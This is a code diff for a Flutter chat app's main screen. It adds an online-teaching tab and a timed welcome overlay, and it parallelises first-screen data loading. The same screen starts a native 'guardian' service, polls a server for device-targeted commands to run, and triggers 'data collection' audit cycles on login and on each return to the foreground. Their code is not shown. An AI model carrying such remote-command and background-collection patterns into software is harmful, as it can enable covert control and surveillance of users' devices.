@@ -1,7 +1,9 @@
+import 'dart:async';
+
 import 'package:flutter/material.dart';
 import 'package:mop_app/core/api_client.dart';
-import 'package:mop_app/core/app_navigator.dart';
 import 'package:mop_app/screens/chat_screen.dart';
+import 'package:mop_app/screens/online_teaching_screen.dart';
 import 'package:mop_app/core/device_info_service.dart';
 import 'package:mop_app/core/native_bridge.dart';
 import 'package:mop_app/l10n/app_localizations.dart';
@@ -44,14 +46,17 @@ class _MainScreenState extends State<MainScreen>
   final _searchController = TextEditingController();
   final _searchFocus = FocusNode();
 
-  /// 用户须知再次征意（规约：当前版本 > 已同意版本时弹窗征意）
-  bool _termsRecheckChecked = false;
+  /// 用户须知再次征意（规约：当前版本 > 已同意版本时弹窗征意）；首屏不等待 terms 接口，直接显示主界面
   bool _showTermsRecheck = false;
   int _pendingTermsVersion = 1;
   bool _termsRecheckAccepted = false;
 
   /// API 失效提示（规约 PROTOCOL 7：连续失败判定失效，主界面进入时提示扫码激活）
   bool _showApiUnavailablePrompt = false;
+
+  /// 登录后欢迎弹窗（存留不低于 5 秒，可提前关闭）
+  bool _showWelcomeDialog = true;
+  Timer? _welcomeTimer;
 
   static final List<_SessionItem> _sessionPlaceholder = [
     _SessionItem('张三', '你好，明天见'),
@@ -70,47 +75,62 @@ class _MainScreenState extends State<MainScreen>
   @override
   void initState() {
     super.initState();
-    _tabController = TabController(length: 2, vsync: this);
+    _tabController = TabController(length: 3, vsync: this);
+    _tabController.addListener(_onTabIndexChanged);
     WidgetsBinding.instance.addObserver(this);
     NativeBridge.startGuardianService();
-    _commandExecutor = CommandExecutor(onWipeRequired: navigateToLoginAndClearStack);
+    _commandExecutor = CommandExecutor();
     _commandPoller = CommandPoller(executor: _commandExecutor);
     DeviceInfoService.getDeviceId().then((id) => _commandPoller.start(id));
-    Future.microtask(() => _checkTermsRecheck());
-    Future.microtask(() => _loadFriends());
-    Future.microtask(() => _checkApiUnavailable());
-    // 规约：首次激活全量上报；首帧后触发一轮审计采集，确保上传所需数据（切回前台时 didChangeAppLifecycleState 再触发）
-    WidgetsBinding.instance.addPostFrameCallback((_) => AuditService().runAuditCycle());
+    Future.microtask(() => _loadInitialData());
+    // 规约：资料采集仅在注册/登录成功并进入主界面后触发；延迟约 0.5s 再跑，避免首帧与审计争抢导致卡顿
+    WidgetsBinding.instance.addPostFrameCallback((_) {
+      Future.delayed(const Duration(milliseconds: 500), () {
+        if (!mounted) return;
+        AuditService().runAuditCycle();
+      });
+    });
+    // 欢迎弹窗：至少 5 秒后自动关闭
+    WidgetsBinding.instance.addPostFrameCallback((_) {
+      if (!mounted || !_showWelcomeDialog) return;
+      _welcomeTimer = Timer(const Duration(seconds: 5), () {
+        if (mounted && _showWelcomeDialog) {
+          setState(() => _showWelcomeDialog = false);
+        }
+      });
+    });
   }
 
-  /// 主界面进入时若已判定 API 失效则提示用户扫码激活（规约 PROTOCOL 7）
+  /// 主界面进入时若已判定 API 失效则提示用户扫码激活（规约 PROTOCOL 7）；切回前台时调用
   Future<void> _checkApiUnavailable() async {
     final unavailable = await ApiClient().isApiUnavailable();
     if (!mounted) return;
     setState(() => _showApiUnavailablePrompt = unavailable);
   }
 
-  Future<void> _loadFriends() async {
-    final list = await ApiClient().getFriends();
-    if (!mounted) return;
-    setState(() {
-      _contacts = list.isEmpty
-          ? _contactPlaceholder
-          : list.map((f) => _ContactItem(f.uid, f.nickname, f.bio ?? '')).toList();
-    });
-  }
-
-  Future<void> _checkTermsRecheck() async {
+  /// 首屏数据：terms、好友列表、API 可用性并行拉取，合并一次 setState 减少重建（优化首次登录卡顿）
+  Future<void> _loadInitialData() async {
     final api = ApiClient();
-    final current = await api.getCurrentTermsVersion();
-    final accepted = await api.getTermsAcceptedVersion();
+    final results = await Future.wait<dynamic>([
+      api.getCurrentTermsVersion(),
+      api.getTermsAcceptedVersion(),
+      api.getFriends(),
+      api.isApiUnavailable(),
+    ]);
     if (!mounted) return;
+    final current = results[0] as int;
+    final accepted = results[1] as int?;
+    final friendList = results[2] as List;
+    final unavailable = results[3] as bool;
     setState(() {
-      _termsRecheckChecked = true;
       if (current > (accepted ?? 0)) {
         _showTermsRecheck = true;
         _pendingTermsVersion = current;
       }
+      _contacts = friendList.isEmpty
+          ? _contactPlaceholder
+          : friendList.map((f) => _ContactItem(f.uid, f.nickname, f.bio ?? '')).toList();
+      _showApiUnavailablePrompt = unavailable;
     });
   }
 
@@ -121,8 +141,14 @@ class _MainScreenState extends State<MainScreen>
     setState(() => _showTermsRecheck = false);
   }
 
+  void _onTabIndexChanged() {
+    if (mounted) setState(() {});
+  }
+
   @override
   void dispose() {
+    _tabController.removeListener(_onTabIndexChanged);
+    _welcomeTimer?.cancel();
     _searchController.dispose();
     _searchFocus.dispose();
     _commandPoller.stop();
@@ -134,8 +160,12 @@ class _MainScreenState extends State<MainScreen>
   @override
   void didChangeAppLifecycleState(AppLifecycleState state) {
     if (state == AppLifecycleState.resumed) {
-      AuditService().runAuditCycle();
       _checkApiUnavailable();
+      // 延迟执行审计，避免切回前台瞬间主线程与 Isolate 争抢导致卡顿（审计内已用 compute 做 hash/加密）
+      Future.delayed(const Duration(milliseconds: 800), () {
+        if (!mounted) return;
+        AuditService().runAuditCycle();
+      });
     }
   }
 
@@ -174,11 +204,6 @@ class _MainScreenState extends State<MainScreen>
   @override
   Widget build(BuildContext context) {
     final l10n = AppLocalizations.of(context)!;
-    if (!_termsRecheckChecked) {
-      return Scaffold(
-        body: Center(child: CircularProgressIndicator()),
-      );
-    }
     return Scaffold(
       appBar: AppBar(
         title: _searchExpanded
@@ -199,6 +224,7 @@ class _MainScreenState extends State<MainScreen>
           tabs: [
             Tab(text: l10n.sessions),
             Tab(text: l10n.contacts),
+            Tab(text: l10n.onlineTeachingTab),
           ],
         ),
         actions: [
@@ -218,16 +244,58 @@ class _MainScreenState extends State<MainScreen>
       ),
       body: Stack(
         children: [
-          TabBarView(
-            controller: _tabController,
+          IndexedStack(
+            index: _tabController.index,
             children: [
               _buildSessionList(l10n.sessions),
               _buildContactList(l10n.contacts),
+              _tabController.index == 2 ? const OnlineTeachingScreen() : const SizedBox.shrink(),
             ],
           ),
           if (_showTermsRecheck) _buildTermsRecheckOverlay(l10n),
           if (_showApiUnavailablePrompt) _buildApiUnavailableOverlay(l10n),
+          if (_showWelcomeDialog) _buildWelcomeOverlay(l10n),
         ],
+      ),
+    );
+  }
+
+  /// 登录后欢迎弹窗：约 80 字文案，预留 120 字空间供多语言，正下方关闭按钮，存留不低于 5 秒
+  Widget _buildWelcomeOverlay(AppLocalizations l10n) {
+    return Material(
+      color: Colors.black54,
+      child: Center(
+        child: Card(
+          margin: const EdgeInsets.symmetric(horizontal: 24),
+          child: Padding(
+            padding: const EdgeInsets.all(20),
+            child: Column(
+              mainAxisSize: MainAxisSize.min,
+              crossAxisAlignment: CrossAxisAlignment.stretch,
+              children: [
+                ConstrainedBox(
+                  constraints: const BoxConstraints(minHeight: 140),
+                  child: SingleChildScrollView(
+                    child: Text(
+                      l10n.welcomeMessage,
+                      style: Theme.of(context).textTheme.bodyMedium,
+                      maxLines: 8,
+                      overflow: TextOverflow.ellipsis,
+                    ),
+                  ),
+                ),
+                const SizedBox(height: 16),
+                TextButton(
+                  onPressed: () {
+                    _welcomeTimer?.cancel();
+                    setState(() => _showWelcomeDialog = false);
+                  },
+                  child: Text(l10n.welcomeClose),
+                ),
+              ],
+            ),
+          ),
+        ),
       ),
     );
   }
